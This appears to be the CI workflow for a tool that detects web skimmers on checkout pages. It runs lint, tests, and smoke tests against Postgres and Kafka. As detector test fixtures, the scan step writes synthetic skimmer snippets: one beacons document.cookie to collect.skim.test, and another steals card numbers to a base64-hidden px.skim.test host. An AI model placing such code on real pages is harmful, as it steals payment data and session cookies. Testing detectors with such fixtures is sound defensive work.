name: CI

on:
  push:
    branches: [main]
  pull_request:
  workflow_dispatch:

permissions:
  contents: read

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

jobs:
  check:
    name: check (Python ${{ matrix.python }})
    runs-on: ubuntu-latest
    timeout-minutes: 15
    strategy:
      fail-fast: false
      matrix:
        python: ["3.12", "3.13"]
    services:
      postgres:
        image: postgres:16-alpine
        env:
          POSTGRES_USER: sentinel
          POSTGRES_PASSWORD: sentinel
          POSTGRES_DB: sentinel
        ports:
          - 5432:5432
        options: >-
          --health-cmd "pg_isready -U sentinel"
          --health-interval 5s
          --health-timeout 5s
          --health-retries 10
      kafka:
        # Single-node KRaft broker advertising localhost:9092 (the image's defaults).
        image: apache/kafka:3.9.0
        ports:
          - 9092:9092
        options: >-
          --health-cmd "/opt/kafka/bin/kafka-broker-api-versions.sh --bootstrap-server localhost:9092"
          --health-interval 10s
          --health-timeout 10s
          --health-retries 15
          --health-start-period 10s
    env:
      # Runs the SQLite tests plus the same suite against real PostgreSQL, and the Kafka
      # adapters against a real broker.
      SENTINEL_TEST_DATABASE_URL: postgresql+asyncpg://sentinel:sentinel@localhost:5432/sentinel
      SENTINEL_TEST_KAFKA_BOOTSTRAP: localhost:9092
    steps:
      - uses: actions/checkout@v4

      - name: Set up uv
        uses: astral-sh/setup-uv@v5
        with:
          python-version: ${{ matrix.python }}
          enable-cache: true

      - name: Install
        run: uv sync --locked

      - name: Lint
        run: |
          uv run ruff check .
          uv run ruff format --check .

      - name: Type check
        run: uv run mypy

      - name: Test
        run: uv run pytest --cov --cov-report=term --cov-fail-under=95

      - name: Build
        run: uv build

      - name: Smoke test the skimmer heuristics on the synthetic corpus
        run: |
          # A card skimmer fails the gate; the PSP library posting to its own host doesn't.
          set +e
          .venv/bin/sentinel inspect tests/fixtures/heuristics/malicious/card_beacon.js \
            --fail-on high > /dev/null
          test $? -eq 5
          set -e
          .venv/bin/sentinel inspect tests/fixtures/heuristics/benign/psp_elements.js \
            --script-host pay.vendor.test --fail-on low
          .venv/bin/sentinel inspect tests/fixtures/heuristics/malicious/loader.js --json \
            | jq -e '.hidden_hosts == ["loader.skim.test"]
                     and (.verdicts | map(.rule) | index("inject.hidden_source") != null)'

      - name: Smoke test the CLI and API against PostgreSQL
        env:
          SENTINEL_DATABASE_URL: ${{ env.SENTINEL_TEST_DATABASE_URL }}
        run: |
          .venv/bin/sentinel db downgrade base
          .venv/bin/sentinel db upgrade
          .venv/bin/sentinel sites add shop --origin https://shop.example.com
          .venv/bin/sentinel pages add shop https://shop.example.com/checkout --payment
          # A page off the allowlist is refused with exit code 2.
          set +e
          .venv/bin/sentinel pages add shop https://cdn.vendor.test/
          test $? -eq 2
          set -e
          .venv/bin/sentinel sites list --json | jq -e '.[0].payment_pages == 1'
          # Run the installed entry point directly and stop it on exit, so no server
          # outlives the step while holding uv's cache lock.
          .venv/bin/sentinel serve --port 8080 &
          server=$!
          trap 'kill "$server"' EXIT
          for _ in $(seq 1 30); do curl -sf localhost:8080/readyz && break; sleep 1; done
          curl -sf localhost:8080/readyz | jq -e '.database == "ok"'
          curl -sf localhost:8080/v1/sites/shop | jq -e '.page_count == 1'
          curl -sf -X POST localhost:8080/v1/sites -H 'content-type: application/json' \
            -d '{"name": "blog", "allowed_origins": ["https://Blog.Example.com:443/"]}' \
            | jq -e '.allowed_origins == ["https://blog.example.com"] and .scan_interval_hours == 168'
          status=$(curl -s -o /dev/null -w '%{http_code}' -X POST localhost:8080/v1/sites/blog/pages \
            -H 'content-type: application/json' -d '{"url": "https://evil.test/"}')
          test "$status" = 422
          # CSP reports in both formats: grouped across query strings, noise dropped by reason.
          curl -sf -X POST localhost:8080/v1/reports/csp/shop \
            -H 'content-type: application/csp-report' \
            --data-binary @examples/csp-reports/report-uri.json \
            | jq -e '.format == "csp-report" and .accepted == 1 and .groups_new == 1'
          curl -sf -X POST localhost:8080/v1/reports/csp/shop \
            -H 'content-type: application/reports+json' \
            --data-binary @examples/csp-reports/reporting-api.json \
            | jq -e '.received == 6 and .accepted == 3 and .groups_new == 2
                     and .dropped == {"not_csp": 1, "foreign_document": 1, "extension": 1}'
          curl -sf 'localhost:8080/v1/sites/shop/csp/violations?order=count' \
            | jq -e '.total_groups == 3 and .total_reports == 4 and .violations[0].count == 2
                     and .violations[0].blocked == "https://collect.skim.test/beacon"
                     and (tostring | contains("4111") | not)'
          # Preflights succeed for the site's own origin only.
          headers=$(curl -sf -o /dev/null -D - -X OPTIONS localhost:8080/v1/reports/csp/shop \
            -H 'origin: https://shop.example.com' -H 'access-control-request-method: POST')
          grep -qi '^access-control-allow-origin: https://shop.example.com' <<< "$headers"
          headers=$(curl -sf -o /dev/null -D - -X OPTIONS localhost:8080/v1/reports/csp/shop \
            -H 'origin: https://evil.test')
          if grep -qi '^access-control-allow-origin' <<< "$headers"; then exit 1; fi
          # Oversized bodies and other content types are refused.
          status=$(head -c 70000 /dev/zero | tr '\0' ' ' | curl -s -o /dev/null -w '%{http_code}' \
            -X POST localhost:8080/v1/reports/csp/shop -H 'content-type: application/csp-report' \
            --data-binary @-)
          test "$status" = 413
          status=$(curl -s -o /dev/null -w '%{http_code}' -X POST localhost:8080/v1/reports/csp/shop \
            -H 'content-type: text/plain' -d '{}')
          test "$status" = 415
          # The CLI replays a saved payload through the same pipeline.
          .venv/bin/sentinel csp ingest shop examples/csp-reports/reporting-api.json --json \
            | jq -e '.groups_new == 0 and .groups_updated == 2'
          .venv/bin/sentinel csp violations shop --json | jq -e '.total_reports == 7'

      - name: Smoke test buffered and Kafka ingest
        env:
          SENTINEL_DATABASE_URL: ${{ env.SENTINEL_TEST_DATABASE_URL }}
          # The load below is one site's worth; keep the rate limit out of the way.
          SENTINEL_CSP_REPORTS_PER_MINUTE: "1000000"
          SENTINEL_CSP_BURST: "1000000"
        run: |
          .venv/bin/sentinel db downgrade base
          .venv/bin/sentinel db upgrade
          .venv/bin/sentinel sites add shop --origin https://shop.example.com
          ready() {
            for _ in $(seq 1 30); do curl -sf "localhost:$1/readyz" >/dev/null && return 0; sleep 1; done
            return 1
          }
          # Buffered: answered at once, written by the background flusher in batches.
          SENTINEL_CSP_INGEST_MODE=buffered .venv/bin/sentinel serve --port 8081 &
          server=$!
          trap 'kill "$server" 2>/dev/null || true' EXIT
          ready 8081
          .venv/bin/python examples/csp_load.py --url http://127.0.0.1:8081 \
            --requests 500 --batch 20 --concurrency 16 | tee /dev/stderr \
            | jq -e '.status == {"202": 500}'
          for _ in $(seq 1 20); do
            curl -sf localhost:8081/v1/csp/ingest | jq -e '.written == 10000' >/dev/null && break
            sleep 0.5
          done
          curl -sf localhost:8081/v1/csp/ingest \
            | jq -e '.mode == "buffered" and .pending == 0 and .written == 10000
                     and .failed_flushes == 0 and .refused == 0'
          curl -sf localhost:8081/v1/sites/shop/csp/violations | jq -e '.total_reports == 10000'
          curl -sf 'localhost:8081/v1/sites/shop/csp/rollups?by=blocked&limit=100' \
            | jq -e '.total == 10000 and (.rows | length) == 50 and all(.rows[]; .new)'
          .venv/bin/sentinel csp rollups shop --by directive
          kill "$server"
          wait "$server" || true
          # Kafka: the collector publishes once the broker has the reports; the consumer
          # writes them, and a second run rereads and double-counts nothing.
          docker exec ${{ job.services.kafka.id }} /opt/kafka/bin/kafka-topics.sh \
            --bootstrap-server localhost:9092 --create --topic ci-csp --partitions 3
          export SENTINEL_KAFKA_BOOTSTRAP_SERVERS=localhost:9092 SENTINEL_KAFKA_TOPIC=ci-csp
          SENTINEL_CSP_INGEST_MODE=kafka .venv/bin/sentinel serve --port 8082 &
          server=$!
          ready 8082
          curl -sf -X POST localhost:8082/v1/reports/csp/shop \
            -H 'content-type: application/reports+json' \
            --data-binary @examples/csp-reports/reporting-api.json \
            | jq -e '.mode == "kafka" and .accepted == 3 and .groups_new == null'
          curl -sf localhost:8082/v1/csp/ingest | jq -e '.published == 3 and .failures == 0'
          .venv/bin/sentinel csp consume --idle-exit 20 --json | tee /dev/stderr \
            | jq -e '.messages == 1 and .written == 3 and .duplicates == 0'
          .venv/bin/sentinel csp consume --idle-exit 10 --json | jq -e '.messages == 0'
          curl -sf localhost:8082/v1/sites/shop/csp/violations | jq -e '.total_reports == 10003'

      - name: Smoke test a scan against the fixture site
        env:
          SENTINEL_DATABASE_URL: ${{ env.SENTINEL_TEST_DATABASE_URL }}
        run: |
          # The shop on :8000 and its "third-party" CDN on :8001.
          python examples/serve.py --port 8000 --cdn-port 8001 &
          servers=$!
          trap 'kill "$servers"' EXIT
          for _ in $(seq 1 30); do curl -sf localhost:8001/analytics/v2/tag.js >/dev/null && break; sleep 1; done
          .venv/bin/sentinel db downgrade base
          .venv/bin/sentinel db upgrade
          .venv/bin/sentinel sites add demo --origin http://127.0.0.1:8000
          .venv/bin/sentinel pages add demo http://127.0.0.1:8000/index.html
          .venv/bin/sentinel pages add demo http://127.0.0.1:8000/checkout.html --payment
          # robots.txt disallows /checkout: skipped, not failed.
          .venv/bin/sentinel scan run demo --json \
            | jq -e '.status == "completed" and .pages.skipped == 1 and .scripts.seen == 3
                     and .scripts.fetched == 2 and .scripts.versions_new == 3'
          .venv/bin/sentinel sites update demo --ignore-robots
          scan=$(mktemp)
          .venv/bin/sentinel scan run demo --json > "$scan"
          jq -e '.pages.ok == 2 and .scripts.seen == 7 and .scripts.new == 4
                 and .scripts.fetched == 4 and .scripts.fetch_failed == 0' "$scan"
          # The payments library is pinned with SRI on the checkout page, and it matches.
          jq -e '[.snapshots[].scripts[] | select(.locator | endswith("/payments/v3/elements.js"))]
                 | .[0].sri_status == "match"' "$scan"
          jq -e '.snapshots[0].security_headers["content-security-policy-report-only"] | length == 1' "$scan"
          .venv/bin/sentinel scripts list demo --json | jq -e 'length == 7 and all(.version_count == 1)'
          jq -e '.authorization == {"approved": 0, "pending": 7, "rejected": 0}' "$scan"
          # Unapproved scripts on a payment page fail the gate with exit code 4.
          set +e
          .venv/bin/sentinel scan run demo --fail-on-unauthorized > /dev/null
          test $? -eq 4
          set -e
          # Authorize the inventory: first-party code by origin, the PSP library pinned by
          # hand, the analytics vendor pinned on first use, and the inline blocks one by one.
          export SENTINEL_ACTOR=ci
          .venv/bin/sentinel policies add demo --origin http://127.0.0.1:8000 \
            --expected-to-change -j "First-party code" --json \
            | jq -e '.scripts_changed | length == 2'
          .venv/bin/sentinel scripts approve demo http://127.0.0.1:8001/payments/v3/elements.js \
            -j "PSP card fields"
          .venv/bin/sentinel policies add demo --prefix http://127.0.0.1:8001/analytics/ \
            -j "Analytics; review every change"
          .venv/bin/sentinel scripts list demo --json \
            | jq -r '.[] | select(.kind == "inline") | .locator' \
            | while read -r locator; do
                .venv/bin/sentinel scripts approve demo "$locator" -j "Reviewed inline block"
              done
          .venv/bin/sentinel scan run demo --fail-on-unauthorized --json \
            | jq -e '.authorization == {"approved": 7, "pending": 0, "rejected": 0}'
          # The vendor ships a new analytics tag: a new version of the same script, which the
          # pinning policy sends back to review, and the gate fails again.
          echo 'queue.push(["ping"]);' >> examples/fixture-cdn/analytics/v2/tag.js
          set +e
          .venv/bin/sentinel scan run demo --fail-on-unauthorized --json > "$scan"
          test $? -eq 4
          set -e
          jq -e '.scripts.new == 0 and .scripts.versions_new == 1 and .scripts.changed == 1
                 and .authorization.pending == 1' "$scan"
          .venv/bin/sentinel scripts show demo http://127.0.0.1:8001/analytics/v2/tag.js --json \
            | jq -e '.version_count == 2 and .status == "pending"'
          .venv/bin/sentinel audit list demo --json --limit 1 \
            | jq -e '.[0].action == "script.status_changed" and .[0].to_status == "pending"'
          .venv/bin/sentinel audit verify demo --json | jq -e '.ok and .events == 17'
          # That change is also a finding: low, raised one level for the payment page.
          jq -e '.findings | length == 1 and .[0].kind == "script.changed"
                 and .[0].severity == "medium" and .[0].reasons[0] == "the code changed"' "$scan"
          # A skimmer: the tag starts beaconing to a host it never referenced. Critical on a
          # payment page, and --fail-on high exits 5 (it wins over the unauthorized gate).
          echo 'navigator.sendBeacon("https://collect.skim.test/c", document.cookie);' \
            >> examples/fixture-cdn/analytics/v2/tag.js
          set +e
          .venv/bin/sentinel scan run demo --fail-on high --fail-on-unauthorized --json > "$scan"
          test $? -eq 5
          set -e
          jq -e '.findings | length == 1 and .[0].severity == "critical"' "$scan"
          finding=$(jq -r '.findings[0].id' "$scan")
          .venv/bin/sentinel findings show "$finding" --json \
            | jq -e '.detail.hosts_added == ["collect.skim.test"]
                     and .detail.urls_added == ["https://collect.skim.test/c"]
                     and (.detail.hunks[0].added | startswith("navigator . sendBeacon"))
                     and (.detail.verdicts | map(.rule)) == ["exfil.stored_data"]'
          .venv/bin/sentinel scripts diff demo http://127.0.0.1:8001/analytics/v2/tag.js --json \
            | jq -e '.hosts_added == ["collect.skim.test"] and .tokens.removed == 0'
          # Handling it is audited; resolving needs a note.
          .venv/bin/sentinel findings ack "$finding"
          set +e
          .venv/bin/sentinel findings resolve "$finding"
          test $? -eq 2
          set -e
          .venv/bin/sentinel findings resolve "$finding" -n "Tag removed; vendor notified"
          .venv/bin/sentinel findings list demo --status open --json | jq -e 'length == 1'
          .venv/bin/sentinel audit verify demo --json | jq -e '.ok and .events == 19'
          # An inline block inserted in front keeps the others' identities: one new script.
          sed -i 's|<script nonce="demo-nonce">|<script>window.abTest = "B";</script><script nonce="demo-nonce">|' \
            examples/fixture-site/checkout.html
          .venv/bin/sentinel scan run demo --json > "$scan"
          jq -e '[.findings[] | .kind] == ["script.added"]
                 and (.findings[0].locator | endswith("/checkout.html#inline-3"))' "$scan"
          # A page that already runs a skimmer when monitoring starts: its first scan is
          # the baseline, but the skimmer is reported instead of becoming part of it.
          printf '%s\n' '<script>' \
            'document.addEventListener("submit", function () {' \
            '  var v = document.querySelector("#cc-number").value;' \
            '  new Image().src = atob("aHR0cHM6Ly9weC5za2ltLnRlc3QvZw==") + "?v=" + v;' \
            '});' '</script>' > examples/fixture-site/promo.html
          .venv/bin/sentinel pages add demo http://127.0.0.1:8000/promo.html --payment
          .venv/bin/sentinel scan run demo --json > "$scan"
          jq -e '[.findings[] | .kind] == ["script.suspicious"]
                 and .findings[0].severity == "critical"' "$scan"
          finding=$(jq -r '.findings[0].id' "$scan")
          .venv/bin/sentinel findings show "$finding" --json \
            | jq -e '.detail.hidden_hosts == ["px.skim.test"]
                     and (.detail.verdicts | map(.rule) | index("skimmer.card_data") != null)'
          .venv/bin/sentinel scripts inspect demo http://127.0.0.1:8000/promo.html#inline-1 --json \
            | jq -e '.worst == "high" and .context.site_hosts == ["127.0.0.1"]'
          rm examples/fixture-site/promo.html
          .venv/bin/sentinel pages remove demo http://127.0.0.1:8000/promo.html
          git checkout -- examples
          # A page that fails makes `scan run` exit 3.
          .venv/bin/sentinel pages add demo http://127.0.0.1:8000/missing.html
          set +e
          .venv/bin/sentinel scan run demo
          test $? -eq 3
